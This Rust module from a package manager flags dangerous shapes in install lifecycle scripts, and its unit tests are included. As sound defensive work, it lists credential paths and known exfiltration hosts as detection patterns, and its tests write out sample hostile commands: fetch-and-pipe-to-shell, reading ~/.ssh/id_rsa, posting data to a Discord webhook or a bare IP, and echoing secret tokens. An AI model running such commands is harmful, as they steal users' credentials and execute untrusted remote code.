//! Content sniff for install lifecycle scripts.
//!
//! A lifecycle script is arbitrary shell, so nothing here can be a decision
//! procedure. The sniff exists to make the *review* better: when an install
//! reports packages whose scripts were skipped for lack of approval, each
//! report carries the shapes a reviewer would otherwise have to spot by
//! reading the script themselves. Findings are advisory — they never block an
//! install and never change a trust decision.
//!
//! # Contents
//! - [`ScriptFinding`] — one matched shape, with a stable code.
//! - [`suspicious_script_findings`] — scan one script body.
//!
//! # Invariants
//! - Matching is case-insensitive and substring-based; a script is shell text,
//!   not a parseable grammar, so no structure is assumed.
//! - Each shape reports at most once per script, in a fixed order, so a report
//!   is stable across runs.
//! - The scan is advisory only: callers must not gate execution on it.
//!
//! # See also
//! - [`crate::lifecycle`] for the approval gate these findings inform.

/// One suspicious shape found in a lifecycle script.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptFinding {
    /// Stable finding code.
    pub code: &'static str,
    /// Human-readable description of the matched shape.
    pub message: &'static str,
}

/// Scan one lifecycle script body for known-dangerous shapes.
#[must_use]
pub fn suspicious_script_findings(script: &str) -> Vec<ScriptFinding> {
    let lowered = script.to_ascii_lowercase();
    let mut findings = Vec::new();
    if fetches_and_pipes_to_shell(&lowered) {
        findings.push(ScriptFinding {
            code: "PM_SCRIPT_FETCH_PIPES_TO_SHELL",
            message: "downloads a remote payload and pipes it straight into a shell",
        });
    }
    if decodes_and_evaluates(&lowered) {
        findings.push(ScriptFinding {
            code: "PM_SCRIPT_DECODES_AND_EVALUATES",
            message: "decodes an encoded blob and evaluates the result",
        });
    }
    if reads_credential_files(&lowered) {
        findings.push(ScriptFinding {
            code: "PM_SCRIPT_READS_CREDENTIALS",
            message: "reads credential files an install script has no reason to touch",
        });
    }
    if reads_secret_environment(&lowered) {
        findings.push(ScriptFinding {
            code: "PM_SCRIPT_READS_SECRET_ENV",
            message: "reads secret-shaped environment variables",
        });
    }
    if contacts_known_exfil_host(&lowered) {
        findings.push(ScriptFinding {
            code: "PM_SCRIPT_KNOWN_EXFIL_HOST",
            message: "contacts a host commonly used to exfiltrate data",
        });
    }
    if contacts_bare_ip_over_http(&lowered) {
        findings.push(ScriptFinding {
            code: "PM_SCRIPT_BARE_IP_HTTP",
            message: "contacts a bare IP address over plain HTTP",
        });
    }
    findings
}

fn fetches_and_pipes_to_shell(script: &str) -> bool {
    let fetches = ["curl ", "wget ", "fetch "]
        .iter()
        .any(|tool| script.contains(tool));
    if !fetches {
        return false;
    }
    script.split('|').skip(1).any(|stage| {
        let stage = stage.trim_start();
        ["sh", "bash", "zsh", "python", "node", "perl", "ruby"]
            .iter()
            .any(|shell| {
                stage == *shell
                    || stage.starts_with(&format!("{shell} "))
                    || stage.starts_with(&format!("{shell}\n"))
                    || stage.starts_with(&format!("/bin/{shell}"))
                    || stage.starts_with(&format!("/usr/bin/{shell}"))
            })
    })
}

fn decodes_and_evaluates(script: &str) -> bool {
    let decoders = ["atob(", "buffer.from(", "base64 -d", "base64 --decode"];
    let evaluators = [
        "eval(",
        "function(",
        "new function",
        "exec(",
        "child_process",
    ];
    decoders.iter().any(|decoder| script.contains(decoder))
        && evaluators
            .iter()
            .any(|evaluator| script.contains(evaluator))
}

fn reads_credential_files(script: &str) -> bool {
    [
        "/.ssh/",
        ".ssh/id_",
        "/.aws/",
        "/.npmrc",
        "/.config/gh",
        "/.docker/config.json",
        "/.kube/config",
        "/.gitconfig",
    ]
    .iter()
    .any(|path| script.contains(path))
}

fn reads_secret_environment(script: &str) -> bool {
    const MARKERS: [&str; 6] = ["token", "secret", "api_key", "apikey", "password", "passwd"];
    // A secret-shaped name only matters when the script is reading it as an
    // environment variable; a package whose own script mentions "token" in a
    // filename is not what this looks for.
    for (index, _) in script.match_indices("process.env") {
        let tail = &script[index..];
        let window = &tail[..tail.len().min(96)];
        if MARKERS.iter().any(|marker| window.contains(marker)) {
            return true;
        }
    }
    for (index, _) in script.match_indices('$') {
        let tail = &script[index + 1..];
        let name: String = tail
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '{')
            .collect();
        let name = name.trim_start_matches('{').to_ascii_lowercase();
        if !name.is_empty() && MARKERS.iter().any(|marker| name.contains(marker)) {
            return true;
        }
    }
    false
}

fn contacts_known_exfil_host(script: &str) -> bool {
    [
        "discord.com/api/webhooks",
        "discordapp.com/api/webhooks",
        "api.telegram.org/bot",
        "hooks.slack.com/services",
        "burpcollaborator.net",
        "interact.sh",
        "oast.fun",
        "oast.live",
        "oast.site",
        "requestbin.net",
        "pipedream.net",
    ]
    .iter()
    .any(|host| script.contains(host))
}

fn contacts_bare_ip_over_http(script: &str) -> bool {
    script.match_indices("http://").any(|(index, _)| {
        let tail = &script[index + "http://".len()..];
        let host: String = tail
            .chars()
            .take_while(|c| c.is_ascii_digit() || *c == '.')
            .collect();
        let rest_is_host_boundary = tail[host.len()..]
            .chars()
            .next()
            .is_none_or(|c| !c.is_ascii_alphanumeric() && c != '-' && c != '.');
        rest_is_host_boundary && is_dotted_quad(&host)
    })
}

fn is_dotted_quad(host: &str) -> bool {
    let mut octets = 0;
    for part in host.split('.') {
        match part.parse::<u16>() {
            Ok(value) if !part.is_empty() && part.len() <= 3 && value <= 255 => octets += 1,
            _ => return false,
        }
    }
    octets == 4
}

#[cfg(test)]
mod tests {
    use super::*;

    fn codes(script: &str) -> Vec<&'static str> {
        suspicious_script_findings(script)
            .into_iter()
            .map(|finding| finding.code)
            .collect()
    }

    #[test]
    fn ordinary_build_scripts_are_clean() {
        assert!(codes("node-gyp rebuild").is_empty());
        assert!(codes("node scripts/install.js && tsc -p .").is_empty());
        assert!(codes("prebuild-install || node-gyp rebuild").is_empty());
    }

    #[test]
    fn fetch_piped_into_a_shell_is_reported() {
        assert_eq!(
            codes("curl -sL https://example.com/i.sh | sh"),
            ["PM_SCRIPT_FETCH_PIPES_TO_SHELL"]
        );
        assert_eq!(
            codes("wget -qO- https://example.com/i | /bin/bash -s --"),
            ["PM_SCRIPT_FETCH_PIPES_TO_SHELL"]
        );
        assert!(codes("curl -sL https://example.com/a.tgz -o a.tgz").is_empty());
    }

    #[test]
    fn decode_then_evaluate_is_reported() {
        assert_eq!(
            codes("node -e \"eval(atob('Y29uc29sZQ=='))\""),
            ["PM_SCRIPT_DECODES_AND_EVALUATES"]
        );
        assert_eq!(
            codes("node -e \"eval(Buffer.from(p,'base64').toString())\""),
            ["PM_SCRIPT_DECODES_AND_EVALUATES"]
        );
    }

    #[test]
    fn credential_reads_and_secret_env_are_reported() {
        assert_eq!(
            codes("cat ~/.ssh/id_rsa > payload"),
            ["PM_SCRIPT_READS_CREDENTIALS"]
        );
        assert_eq!(
            codes("node -e \"console.log(process.env.NPM_TOKEN)\""),
            ["PM_SCRIPT_READS_SECRET_ENV"]
        );
        assert_eq!(
            codes("echo $AWS_SECRET_ACCESS_KEY"),
            ["PM_SCRIPT_READS_SECRET_ENV"]
        );
        assert!(codes("node -e \"console.log(process.env.NODE_ENV)\"").is_empty());
    }

    #[test]
    fn exfil_hosts_and_bare_ip_targets_are_reported() {
        assert_eq!(
            codes("curl -X POST https://discord.com/api/webhooks/1/2 -d @out"),
            ["PM_SCRIPT_KNOWN_EXFIL_HOST"]
        );
        assert_eq!(
            codes("curl http://185.12.4.9/beacon -d @out"),
            ["PM_SCRIPT_BARE_IP_HTTP"]
        );
        assert!(codes("curl http://registry.example.com/beacon").is_empty());
    }

    #[test]
    fn several_shapes_report_in_a_fixed_order() {
        assert_eq!(
            codes("curl http://1.2.3.4/i.sh | sh && cat ~/.npmrc"),
            [
                "PM_SCRIPT_FETCH_PIPES_TO_SHELL",
                "PM_SCRIPT_READS_CREDENTIALS",
                "PM_SCRIPT_BARE_IP_HTTP",
            ]
        );
    }
}
